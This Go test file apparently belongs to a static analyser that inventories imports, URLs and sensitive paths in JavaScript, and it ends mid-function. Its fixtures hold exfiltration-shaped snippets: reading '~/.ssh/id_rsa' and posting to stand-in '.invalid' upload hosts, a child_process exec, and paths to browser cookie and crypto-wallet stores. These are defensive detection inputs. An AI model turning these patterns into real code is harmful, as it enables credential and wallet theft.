package extract

import (
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestJavaScriptSourceFeaturesInventoryIndependentSyntax(t *testing.T) {
	source := `import fs from "node:fs";
const processTools = require("node:child_process");
async function activate() {
  fs.readFileSync("~/.ssh/id_rsa");
  await net.send("https://direct.example.invalid/upload");
}
const handler = () => { axios.post("https://opaque.example.invalid/upload"); };
"https://docs.rs/security/payload";
"http://internal/payload";
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)

	for _, expectation := range []javaScriptFeatureExpectation{
		{key: javaScriptModuleSpecifierFeatureKey, value: "node:fs", form: "esm-import", line: 1},
		{key: javaScriptModuleSpecifierFeatureKey, value: "node:child_process", form: "commonjs-require", line: 2},
		{key: "script.sensitive_resource", value: "~/.ssh/id_rsa", function: "activate", line: 4},
		{key: "network.url", value: "https://direct.example.invalid/upload", function: "activate", line: 5},
		{key: "network.url", value: "https://opaque.example.invalid/upload", line: 7, unscoped: true},
		{key: "network.url", value: "https://docs.rs/security/payload", line: 8},
		{key: "network.url", value: "http://internal/payload", line: 9},
	} {
		assertJavaScriptFeature(t, graph, expectation)
	}
	if len(graph.Operations) != 0 ||
		len(graph.Relations) != 0 ||
		len(graph.ExecutionRoots) != 0 ||
		len(graph.InvokedTargets) != 0 ||
		len(graph.Network) != 0 {
		t.Fatalf("observational JavaScript lane created semantic facts: %#v", graph)
	}
}

func TestJavaScriptSourceFeaturesRecognizeClosedModuleForms(t *testing.T) {
	source := `import "side-effect";
import fallback from "default";
import fallback2, {read as read2, "remote" as local} from "named";
import {same as first, same as second} from "distinct-local-bindings";
import * as namespace from "namespace";
import data from "attributes" with {type: "json"};
export {same as firstExport, same as secondExport} from "distinct-export-names";
const dynamic = import("dynamic", {with: {type: "json"}});
const trailingDynamic = import("dynamic-trailing",);
const common = require("common",);
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for value, form := range map[string]string{
		"side-effect":             "esm-import",
		"default":                 "esm-import",
		"named":                   "esm-import",
		"distinct-local-bindings": "esm-import",
		"namespace":               "esm-import",
		"attributes":              "esm-import",
		"distinct-export-names":   "esm-re-export",
		"dynamic":                 "dynamic-import",
		"dynamic-trailing":        "dynamic-import",
		"common":                  "commonjs-require",
	} {
		feature := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, value)
		if feature == nil || feature.Qualifiers["form"] != form {
			t.Errorf("module %q form = %#v, want %q", value, feature, form)
		}
	}
}

func TestJavaScriptSourceFeaturesRetainExactBundledCommonJSWrapper(t *testing.T) {
	source := strings.ReplaceAll(`(() => {
var modules = {
317: module => {
"use strict";
module.exports = require("node:child_process");
}
};
function load(id) {
var retained = {exports:{}};
modules[id](retained, retained.exports, load);
return retained.exports;
}
try {
var child = load(317);
var run = child.exec;
run("id");
} catch (error) {}
})();`, "\n", "\r\n")
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	feature := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, "node:child_process")
	if feature == nil || feature.Qualifiers["form"] != "bundled-commonjs-wrapper" || feature.ScopeID != "" || feature.Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("bundled wrapper observation = %#v", feature)
	}
	if len(feature.EvidenceIDs) != 1 {
		t.Fatalf("bundled wrapper evidence = %#v", feature.EvidenceIDs)
	}
	evidence := evidenceByIDForTest(graph, feature.EvidenceIDs[0])
	wantOffset := strings.Index(source, "node:child_process")
	if evidence == nil || evidence.Method != "javascript-lexical" || evidence.Line != 5 || !evidence.OffsetKnown || evidence.Offset != int64(wantOffset) {
		t.Fatalf("bundled wrapper evidence = %#v, want byte offset %d", evidence, wantOffset)
	}
	if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("bundled wrapper observation created behavior: operations=%#v relations=%#v", graph.Operations, graph.Relations)
	}
}

func TestJavaScriptSourceFeaturesSkipEmptyModuleSpecifiers(t *testing.T) {
	source := `import "";
const dynamic = import("");
const common = require("");
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if feature := javaScriptFeatureByKeyValue(
		graph,
		javaScriptModuleSpecifierFeatureKey,
		"",
	); feature != nil {
		t.Fatalf("empty module specifier produced invalid Feature: %#v", feature)
	}
}

func TestJavaScriptSourceFeaturesRecognizeESModuleReExports(t *testing.T) {
	source := `export * from "re-export-all";
export {value, other as renamed} from "re-export-named";
import {get} from "named-contextual-get";
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for value, form := range map[string]string{
		"re-export-all":        "esm-re-export",
		"re-export-named":      "esm-re-export",
		"named-contextual-get": "esm-import",
	} {
		feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		)
		if feature == nil || feature.Qualifiers["form"] != form {
			t.Errorf("module %q form = %#v, want %q", value, feature, form)
		}
	}
}

func TestJavaScriptSourceFeaturesRecognizeCommentsAroundRequireCall(t *testing.T) {
	source := `const commented = require /* loader comment */ ("with-comment");
const argumentComment = require(/* before */ "argument-comment" /* after */);
const plain = require("plain-after-comment");
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for _, value := range []string{
		"with-comment",
		"argument-comment",
		"plain-after-comment",
	} {
		feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		)
		if feature == nil ||
			feature.Qualifiers["form"] != "commonjs-require" {
			t.Errorf("comment-safe require %q = %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesRequireStaticModuleItemContext(t *testing.T) {
	source := `const assignment = import "assignment-context";
if (condition) import "conditional-context";
label: import "label-context";
export default import "export-context";
const nested = export * from "nested-export-context";
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for _, value := range []string{
		"assignment-context",
		"conditional-context",
		"label-context",
		"export-context",
		"nested-export-context",
	} {
		if feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		); feature != nil {
			t.Errorf("invalid module-item context produced %q: %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesRejectMalformedModuleOptionsAndCallTails(t *testing.T) {
	source := `import data from "bad-static-options" with { = };
export * from "bad-export-options" with { = };
const dynamic = import("bad-dynamic-options", { = });
const assigned = require("bad-require-assignment") = replacement;
require("bad-require-adjacent") identifier;
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for _, value := range []string{
		"bad-static-options",
		"bad-export-options",
		"bad-dynamic-options",
		"bad-require-assignment",
		"bad-require-adjacent",
	} {
		if feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		); feature != nil {
			t.Errorf("malformed module syntax produced %q: %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesRejectDuplicateModuleBindingsAndAttributes(
	t *testing.T,
) {
	source := `import {a, a} from "duplicate-import-local";
import fallback, {a as fallback} from "duplicate-default-local";
import fallback2, * as fallback2 from "duplicate-namespace-local";
export {a as out, b as out} from "duplicate-export-alias";
import data from "duplicate-static-attribute" with {type: "json", "type": "json"};
export * from "duplicate-export-attribute" with {type: "json", type: "json"};
const dynamic = import("duplicate-dynamic-attribute", {with: {type: "json", "type": "json"}});
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for _, value := range []string{
		"duplicate-import-local",
		"duplicate-default-local",
		"duplicate-namespace-local",
		"duplicate-export-alias",
		"duplicate-static-attribute",
		"duplicate-export-attribute",
		"duplicate-dynamic-attribute",
	} {
		if feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		); feature != nil {
			t.Errorf("duplicate module name or attribute produced %q: %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesRejectModuleLookalikes(t *testing.T) {
	source := `const prose = "import('quoted-package')";
const raw = ` + "`import(\"template-package\")`" + `;
/import\("regex-package"\)/;
obj.require("member-require");
obj.import("member-import");
import from "missing-clause";
import fallback, from "missing-second-clause";
import {if} from "keyword-binding";
unrelated from "cross-statement";
if (ok) {} /import("regex-after-block")/;
if (ok) {}
/prefix import("regex-next-line")/;
new
import("new-target");
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)

	for _, value := range []string{
		"quoted-package",
		"template-package",
		"regex-package",
		"member-require",
		"member-import",
		"missing-clause",
		"missing-second-clause",
		"keyword-binding",
		"cross-statement",
		"regex-after-block",
		"regex-next-line",
		"new-target",
	} {
		if feature := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, value); feature != nil {
			t.Errorf("lookalike produced module specifier %q: %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesRejectInvalidDynamicImportTails(t *testing.T) {
	source := `import("assignment-target") = replacement;
import("adjacent-identifier") identifier;
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	for _, value := range []string{"assignment-target", "adjacent-identifier"} {
		if feature := javaScriptFeatureByKeyValue(
			graph,
			javaScriptModuleSpecifierFeatureKey,
			value,
		); feature != nil {
			t.Errorf(
				"invalid dynamic-import tail produced module specifier %q: %#v",
				value,
				feature,
			)
		}
	}
}

func TestJavaScriptSourceFeaturesRequireRuntimeIdentity(t *testing.T) {
	source := `const require = fake;
require("shadowed-package");
with (environment) { require("with-shadowed-package"); }
import("dynamic-package");
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)

	for _, value := range []string{"shadowed-package", "with-shadowed-package"} {
		if feature := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, value); feature != nil {
			t.Fatalf("runtime-ambiguous require produced module specifier %q: %#v", value, feature)
		}
	}
	dynamic := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, "dynamic-package")
	if dynamic == nil || dynamic.Qualifiers["form"] != "dynamic-import" {
		t.Fatalf("exact dynamic import was not retained: %#v", javaScriptSourceFeatures(graph))
	}
}

func TestJavaScriptSourceFeaturesKeepProvenPrefixOnMalformedSuffix(t *testing.T) {
	source := `"https://prefix.example.invalid/p";
net.send(
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)

	feature := javaScriptFeatureByKeyValue(graph, "network.url", "https://prefix.example.invalid/p")
	if feature == nil || feature.ScopeID != "" {
		t.Fatalf("safe prefix URL was lost or assigned a scope through malformed syntax: %#v", feature)
	}
	if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "malformed") {
		t.Fatalf("malformed JavaScript Feature suffix was not disclosed: %#v", graph.Coverage)
	}
}

func TestJavaScriptSourceFeaturesFailClosedOnJSXInJavaScriptFile(t *testing.T) {
	source := `const view = <div href="https://jsx-attribute.example.invalid/path">
  import("jsx-child-text")
</div>;
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if features := javaScriptSourceFeatures(graph); len(features) != 0 {
		t.Fatalf("unsupported JSX produced JavaScript Features: %#v", features)
	}
	if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "JSX") {
		t.Fatalf("unsupported JSX was not disclosed: %#v", graph.Coverage)
	}
}

func TestJavaScriptSourceFeaturesFailClosedOnJSXAfterExpressionOperators(t *testing.T) {
	for _, prefix := range []string{
		"ready && ",
		"ready || ",
		"ready + ",
		"! ",
		"void ",
	} {
		t.Run(strings.TrimSpace(prefix), func(t *testing.T) {
			source := `const view = ` + prefix + `<div
 href="https://jsx-operator.example.invalid/path">child</div>;
`
			graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
			if feature := javaScriptFeatureByKeyValue(
				graph,
				"network.url",
				"https://jsx-operator.example.invalid/path",
			); feature != nil {
				t.Fatalf("unsupported JSX produced URL Feature: %#v", feature)
			}
			if !hasCoverageDetail(
				graph,
				javaScriptFeatureAnalysisArea,
				"JSX",
			) {
				t.Fatalf("unsupported JSX was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestJavaScriptSourceFeaturesFailClosedOnJSXInControlBodies(t *testing.T) {
	for _, source := range []string{
		`if (ready) <div href="https://jsx-if.example.invalid/path"/>;`,
		`if (ready) work(); else <div href="https://jsx-else.example.invalid/path"/>;`,
		`while (ready) <div path="~/.ssh/id_rsa"/>;`,
		`for (;;) <Widget href="https://jsx-for.example.invalid/path"/>;`,
	} {
		graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
		if features := javaScriptSourceFeatures(graph); len(features) != 0 {
			t.Errorf("unsupported JSX control body produced Features: %#v", features)
		}
		if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "JSX") {
			t.Errorf("unsupported JSX control body was not disclosed: %#v", graph.Coverage)
		}
	}
}

func TestJavaScriptSourceFeaturesRejectSensitiveLiteralsInRegexAfterBlock(t *testing.T) {
	source := `if (condition) {} /"github_token"/.test(value);`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if feature := javaScriptFeatureByKeyValue(
		graph,
		"script.sensitive_resource",
		"github_token",
	); feature != nil {
		t.Fatalf("regular-expression text produced sensitive resource: %#v", feature)
	}
	if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "slash-ambiguous") {
		t.Fatalf("slash ambiguity was not disclosed: %#v", graph.Coverage)
	}
}

func TestJavaScriptSourceFeaturesRequireExactSensitivePathShape(t *testing.T) {
	const pathURL = "https://docs.example.invalid/Library/Application Support/Google/Chrome/Default/Cookies"
	source := `const pathURL = "` + pathURL + `";
const browserProse = "Documentation about Library/Application Support/Google/Chrome and Cookies";
const walletProse = "Documentation for Library/Application Support/Exodus should not imply access";
`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if feature := javaScriptFeatureByKeyValue(graph, "network.url", pathURL); feature == nil {
		t.Fatalf("exact URL literal was not retained: %#v", graph.Features)
	}
	for _, value := range []string{
		pathURL,
		"Documentation about Library/Application Support/Google/Chrome and Cookies",
		"Documentation for Library/Application Support/Exodus should not imply access",
		"Documentation/.ssh/id_rsa is secret",
		"/documentation says .ssh/id_rsa is secret",
		"~/documentation says .ssh/id_rsa is secret",
		"./documentation says .ssh/id_rsa is secret",
		"/documentation about Library/Application Support/Google/Chrome and Cookies",
		"/tmp/.electrum-not-a-store",
		"/tmp/.metamask-not-a-store",
	} {
		if feature := javaScriptFeatureByKeyValue(
			graph,
			"script.sensitive_resource",
			value,
		); feature != nil {
			t.Errorf("non-path literal produced sensitive resource %q: %#v", value, feature)
		}
	}
}

func TestJavaScriptSourceFeaturesKeepURLAfterUnrelatedDivision(t *testing.T) {
	const value = "https://api.example.invalid/payload"
	source := `const score = parseInt(first) / 1 + parseInt(second) / 2; const endpoint = "` + value + `";`
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if feature := javaScriptFeatureByKeyValue(
		graph,
		"network.url",
		value,
	); feature == nil {
		t.Fatalf("unrelated division hid exact URL: %#v", graph.Coverage)
	}
	if hasCoverageDetail(
		graph,
		javaScriptFeatureAnalysisArea,
		"slash-ambiguous",
	) {
		t.Fatalf("unrelated division caused misleading partial: %#v", graph.Coverage)
	}
}

func TestJavaScriptSourceFeaturesDiscloseOverlongResourceLiteral(t *testing.T) {
	for _, scheme := range []string{
		"HTTP://",
		"https://",
		"ws://",
		"wss://",
		"ftp://",
		"FTP://",
	} {
		t.Run(scheme, func(t *testing.T) {
			value := scheme + strings.Repeat(
				"a",
				maxJavaScriptFeatureValueBytes,
			)
			graph, _ := javaScriptSourceFeatureFixture(
				t,
				"fixture.js",
				`const endpoint = "`+value+`";`,
			)
			if feature := javaScriptFeatureByKeyValue(
				graph,
				"network.url",
				value,
			); feature != nil {
				t.Fatalf("overlong literal produced Feature: %#v", feature)
			}
			if !hasCoverageDetail(
				graph,
				javaScriptFeatureAnalysisArea,
				"value limit",
			) {
				t.Fatalf("overlong literal was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestJavaScriptSourceFeaturesDoNotFlagIrrelevantLongLiteral(t *testing.T) {
	graph, _ := javaScriptSourceFeatureFixture(
		t,
		"fixture.js",
		`const embeddedData = "`+
			strings.Repeat("A", maxJavaScriptFeatureValueBytes+1)+
			`";`,
	)
	if hasCoverageDetail(
		graph,
		javaScriptFeatureAnalysisArea,
		"value limit",
	) {
		t.Fatalf("irrelevant long literal caused resource Coverage: %#v", graph.Coverage)
	}
}

func TestJavaScriptSourceFeaturesRejectInvalidUTF8(t *testing.T) {
	source := string(append(
		[]byte(`const endpoint = "https://example.invalid/`),
		0xff,
		'"',
		';',
	))
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	if features := javaScriptSourceFeatures(graph); len(features) != 0 {
		t.Fatalf("invalid UTF-8 source produced Features: %#v", features)
	}
	if !hasCoverageDetail(
		graph,
		javaScriptFeatureAnalysisArea,
		"invalid UTF-8",
	) {
		t.Fatalf("invalid UTF-8 source was not disclosed: %#v", graph.Coverage)
	}
}

func TestJavaScriptFeatureTokenLimitRetainsOnlyBoundedUnscopedTailLiterals(t *testing.T) {
	source := `const before = "https://before.example.invalid/p";
const divided = value / "https://ambiguous.example.invalid/p" / other;
const expression = require("node:child_process");
const endpoint = "https://tail.example.invalid/upload";
const credential = "/Users/alice/.ssh/id_ed25519";
`
	tokens, observations, details := scanJavaScriptFeatureTokensWithLimit(source, 0)
	if len(tokens) != 0 || !detailsContain(details, "token limit 0") || !detailsContain(details, "bounded unscoped inventory") {
		t.Fatalf("tail fallback boundary = tokens=%d details=%#v", len(tokens), details)
	}
	seen := map[string]bool{}
	for _, observation := range observations {
		seen[observation.key+"\x00"+observation.value] = true
		if observation.scopeKey != "" || observation.scoped || observation.form != "" {
			t.Fatalf("tail literal gained structural context: %#v", observation)
		}
		if observation.key == javaScriptModuleSpecifierFeatureKey {
			t.Fatalf("tail literal fallback inferred a module import: %#v", observation)
		}
	}
	for _, key := range []string{
		"network.url\x00https://before.example.invalid/p",
		"network.url\x00https://tail.example.invalid/upload",
		"script.sensitive_resource\x00/Users/alice/.ssh/id_ed25519",
	} {
		if !seen[key] {
			t.Errorf("missing exact tail literal %q: %#v", key, observations)
		}
	}
	if seen["network.url\x00https://ambiguous.example.invalid/p"] {
		t.Fatalf("slash-ambiguous literal was retained: %#v", observations)
	}
}

func TestJavaScriptFeatureTailLiteralFallbackKeepsMalformedSuffixExplicit(t *testing.T) {
	source := `const endpoint = "https://tail.example.invalid/upload"; (`
	_, observations, details := scanJavaScriptFeatureTokensWithLimit(source, 0)
	if len(observations) != 1 || observations[0].value != "https://tail.example.invalid/upload" {
		t.Fatalf("independently proven prefix literal was lost: %#v", observations)
	}
	if !detailsContain(details, "malformed") {
		t.Fatalf("malformed suffix was not explicit: %#v", details)
	}
}

func TestJavaScriptFeatureTailLiteralFallbackBudgetsAndBenignControl(t *testing.T) {
	var source strings.Builder
	for index := 0; index < maxJavaScriptURLsPerNode+8; index++ {
		fmt.Fprintf(&source, "const endpoint%d = \"https://tail-%d.example.invalid/p\";\n", index, index)
	}
	source.WriteString(`const oversized = "https://`)
	source.WriteString(strings.Repeat("a", maxJavaScriptFeatureValueBytes))
	source.WriteString(`"; const benign = "ordinary documentation";`)

	_, first, firstDetails := scanJavaScriptFeatureTokensWithLimit(source.String(), 0)
	_, second, secondDetails := scanJavaScriptFeatureTokensWithLimit(source.String(), 0)
	if !reflect.DeepEqual(first, second) || !reflect.DeepEqual(firstDetails, secondDetails) {
		t.Fatal("tail literal fallback is nondeterministic")
	}
	if len(first) != maxJavaScriptURLsPerNode {
		t.Fatalf("tail URL observations = %d, want %d", len(first), maxJavaScriptURLsPerNode)
	}
	if !detailsContain(firstDetails, "candidate limit") || !detailsContain(firstDetails, "value limit") {
		t.Fatalf("tail literal budgets were not explicit: %#v", firstDetails)
	}
	for _, observation := range first {
		if observation.value == "ordinary documentation" {
			t.Fatalf("irrelevant benign literal became an observation: %#v", observation)
		}
	}
}

func detailsContain(details []string, fragment string) bool {
	for _, detail := range details {
		if strings.Contains(detail, fragment) {
			return true
		}
	}
	return false
}

func TestJavaScriptSourceFeaturesBoundOneLineDeterministically(t *testing.T) {
	var source strings.Builder
	for index := 0; index < maxJavaScriptFeatureValuesPerLine+8; index++ {
		fmt.Fprintf(&source, `"https://host%d.invalid/p";`, index)
	}

	first, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source.String())
	second, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source.String())
	if !reflect.DeepEqual(first.Features, second.Features) ||
		!reflect.DeepEqual(first.Evidence, second.Evidence) ||
		!reflect.DeepEqual(first.Coverage, second.Coverage) {
		t.Fatal("bounded JavaScript Feature inventory is nondeterministic")
	}
	if countJavaScriptFeatures(first, "network.url") != maxJavaScriptFeatureValuesPerLine {
		t.Fatalf(
			"URL count = %d, want line cap %d",
			countJavaScriptFeatures(first, "network.url"),
			maxJavaScriptFeatureValuesPerLine,
		)
	}
	if !hasCoverageDetail(first, javaScriptFeatureAnalysisArea, "one physical line") {
		t.Fatalf("line observation limit was not disclosed: %#v", first.Coverage)
	}
}

func TestJavaScriptSourceFeaturesBoundNodeCandidates(t *testing.T) {
	var source strings.Builder
	for index := 0; index < maxJavaScriptModuleSpecifiersPerNode+16; index++ {
		fmt.Fprintf(&source, "import \"package-%04d\";\n", index)
	}

	first, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source.String())
	second, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source.String())
	if !reflect.DeepEqual(first.Features, second.Features) ||
		!reflect.DeepEqual(first.Evidence, second.Evidence) ||
		!reflect.DeepEqual(first.Coverage, second.Coverage) {
		t.Fatal("node-bounded JavaScript Feature inventory is nondeterministic")
	}
	if countJavaScriptFeatures(first, javaScriptModuleSpecifierFeatureKey) !=
		maxJavaScriptModuleSpecifiersPerNode {
		t.Fatalf(
			"module count = %d, want node cap %d",
			countJavaScriptFeatures(first, javaScriptModuleSpecifierFeatureKey),
			maxJavaScriptModuleSpecifiersPerNode,
		)
	}
	if !hasCoverageDetail(first, javaScriptFeatureAnalysisArea, "candidate limit") {
		t.Fatalf("node candidate limit was not disclosed: %#v", first.Coverage)
	}
}

func TestJavaScriptSourceFeaturesSortBySelectionPriority(t *testing.T) {
	makeContent := func(nodeID, logicalPath, prefix string) artifact.Content {
		var source strings.Builder
		for index := 0; index < maxJavaScriptModuleSpecifiersPerNode; index++ {
			fmt.Fprintf(&source, "import \"%s-%04d\";\n", prefix, index)
		}
		return artifact.Content{
			NodeID: nodeID, LogicalPath: logicalPath, Kind: "script",
			MediaType: "text/plain", SemanticLanguage: "javascript",
			Data: []byte(source.String()),
		}
	}
	root := makeContent("node-root", "root.js", "root")
	firstDefault := makeContent("node-a", "a.js", "a")
	secondDefault := makeContent("node-z", "z.js", "z")
	run := func(contents []artifact.Content) behavior.Graph {
		var graph behavior.Graph
		graph.AddAnalysisSelection(behavior.AnalysisSelection{
			NodeID:  root.NodeID,
			Reasons: []behavior.SelectionReason{behavior.SelectionReasonExecutionRoot},
		})
		for _, content := range []artifact.Content{firstDefault, secondDefault} {
			graph.AddAnalysisSelection(behavior.AnalysisSelection{
				NodeID:  content.NodeID,
				Reasons: []behavior.SelectionReason{behavior.SelectionReasonDefaultRelevant},
			})
		}
		addJavaScriptSourceFeatures(&graph, contents)
		if err := graph.Sort(); err != nil {
			t.Fatal(err)
		}
		return graph
	}

	forward := run([]artifact.Content{secondDefault, root, firstDefault})
	reverse := run([]artifact.Content{firstDefault, root, secondDefault})
	if !reflect.DeepEqual(forward.Features, reverse.Features) ||
		!reflect.DeepEqual(forward.Evidence, reverse.Evidence) ||
		!reflect.DeepEqual(forward.Coverage, reverse.Coverage) {
		t.Fatal("content order changed inspection-bounded JavaScript inventory")
	}
	if javaScriptFeatureByKeyValue(forward, javaScriptModuleSpecifierFeatureKey, "root-0255") == nil ||
		javaScriptFeatureByKeyValue(forward, javaScriptModuleSpecifierFeatureKey, "a-0255") == nil ||
		javaScriptFeatureByKeyValue(forward, javaScriptModuleSpecifierFeatureKey, "z-0000") != nil {
		t.Fatalf("selection priority did not retain root then stable default node: %#v", forward.Features)
	}
}

func TestJavaScriptSourceFeaturesDoNotDeduplicateSemanticFeatureAcrossScope(t *testing.T) {
	const value = "https://same.example.invalid/p"
	source := `function activate() {
  "` + value + `";
}
`
	graph, content := newJavaScriptSourceFeatureFixture(t, "fixture.js", source)
	connected := connectedExecutionContext([]string{"root-fixture"}, nil)
	evidenceID := graph.AddEvidence(behavior.Evidence{
		NodeID: content.NodeID, ScopeID: content.ScopeID,
		Method: "fixture-semantic", Kind: "url", Value: value,
	})
	graph.AddFeature(behavior.Feature{
		NodeID: content.NodeID, ScopeID: content.ScopeID,
		Key: "network.url", Value: value, EvidenceIDs: []string{evidenceID},
		Support: behavior.SupportCorroborated, Execution: connected,
	})

	addJavaScriptSourceFeatures(&graph, []artifact.Content{content})
	if err := graph.Sort(); err != nil {
		t.Fatal(err)
	}
	feature := javaScriptFeatureByKeyValue(graph, "network.url", value)
	if feature == nil ||
		feature.SourceFunction != "activate" ||
		feature.Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("independent scoped lexical URL was erased by semantic fact: %#v", graph.Features)
	}
}

func TestJavaScriptSourceFeaturesNeverGainExecutionOwnership(t *testing.T) {
	source := `function activate() {
  "~/.ssh/id_rsa";
}
`
	graph, content := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	connected := connectedExecutionContext([]string{"root-fixture"}, nil)
	graph.Features = append(graph.Features, behavior.Feature{
		ID: "feature-direct-call", NodeID: content.NodeID, ScopeID: content.ScopeID,
		Key: "script.function_call", Value: "activate",
		EvidenceIDs: []string{"ev-fixture"}, Support: behavior.SupportDirect,
		Execution: connected,
	})
	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{content.NodeID: connected})
	promoteDirectScriptFunctionCalls(&graph, map[string]behavior.ExecutionContext{content.NodeID: connected})

	for _, feature := range javaScriptSourceFeatures(graph) {
		if feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(feature.Execution.ExecutionRootIDs) != 0 ||
			len(feature.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("observational Feature gained execution ownership: %#v", feature)
		}
	}
}

func TestJavaScriptSourceFeaturesSupportHashbangAndBOM(t *testing.T) {
	source := "\xef\xbb\xbf#!/usr/bin/env node\r\nimport fs from \"node:fs\";\r\n"
	graph, _ := javaScriptSourceFeatureFixture(t, "fixture.js", source)
	feature := javaScriptFeatureByKeyValue(graph, javaScriptModuleSpecifierFeatureKey, "node:fs")
	if feature == nil {
		t.Fatalf("BOM/hashbang hid module specifier: %#v", graph.Coverage)
		return
	}
	if len(feature.EvidenceIDs) == 0 {
		t.Fatalf("BOM/hashbang module specifier has no evidence: %#v", feature)
	}
	evidence := evidenceByIDForTest(graph, feature.EvidenceIDs[0])
	wantOffset := strings.Index(source, `"node:fs"`)
	if evidence == nil ||
		evidence.Line != 2 ||
		evidence.Offset != int64(wantOffset) ||
		!evidence.ByteOffsetKnown() {
		t.Fatalf("BOM/hashbang evidence = %#v, want line 2 offset %d", evidence, wantOffset)
	}
}

func TestJavaScriptSourceFeaturesDiscloseUnsupportedTypedDialects(t *testing.T) {
	for _, logicalPath := range []string{"fixture.ts", "fixture.tsx", "fixture.jsx"} {
		t.Run(logicalPath, func(t *testing.T) {
			graph, _ := javaScriptSourceFeatureFixture(
				t,
				logicalPath,
				`import fs from "node:fs";`,
			)
			if len(javaScriptSourceFeatures(graph)) != 0 {
				t.Fatalf("unsupported dialect produced Features: %#v", graph.Features)
			}
			if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "unavailable") {
				t.Fatalf("unsupported dialect was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestJavaScriptSourceFeaturesDiscloseStructuralLimit(t *testing.T) {
	saved := defaultJavaScriptStructuralLimits
	limited := saved
	limited.statements = 1
	defaultJavaScriptStructuralLimits = limited
	t.Cleanup(func() {
		defaultJavaScriptStructuralLimits = saved
	})

	graph, _ := javaScriptSourceFeatureFixture(
		t,
		"fixture.js",
		"const first = 1;\nconst loaded = require(\"hidden-after-limit\");\n",
	)
	if feature := javaScriptFeatureByKeyValue(
		graph,
		javaScriptModuleSpecifierFeatureKey,
		"hidden-after-limit",
	); feature != nil {
		t.Fatalf("structurally limited require produced module specifier: %#v", feature)
	}
	if !hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "statement limit") ||
		!hasCoverageDetail(graph, javaScriptFeatureAnalysisArea, "runtime-identity") {
		t.Fatalf("structural limit was not disclosed: %#v", graph.Coverage)
	}
}

type javaScriptFeatureExpectation struct {
	key      string
	value    string
	form     string
	function string
	line     int
	unscoped bool
}

func javaScriptSourceFeatureFixture(
	t *testing.T,
	logicalPath, source string,
) (behavior.Graph, artifact.Content) {
	t.Helper()
	graph, content := newJavaScriptSourceFeatureFixture(t, logicalPath, source)
	addJavaScriptSourceFeatures(&graph, []artifact.Content{content})
	if err := graph.Sort(); err != nil {
		t.Fatalf("invalid JavaScript feature fixture graph: %v", err)
	}
	return graph, content
}

func newJavaScriptSourceFeatureFixture(
	t *testing.T,
	logicalPath, source string,
) (behavior.Graph, artifact.Content) {
	t.Helper()
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:           "node-javascript-features",
		LogicalPath:      logicalPath,
		PhysicalPath:     "/private/test/" + logicalPath,
		Kind:             "script",
		MediaType:        "text/plain",
		SemanticLanguage: "javascript",
		Data:             []byte(source),
	}
	content.ScopeID = graph.AddScope(behavior.Scope{
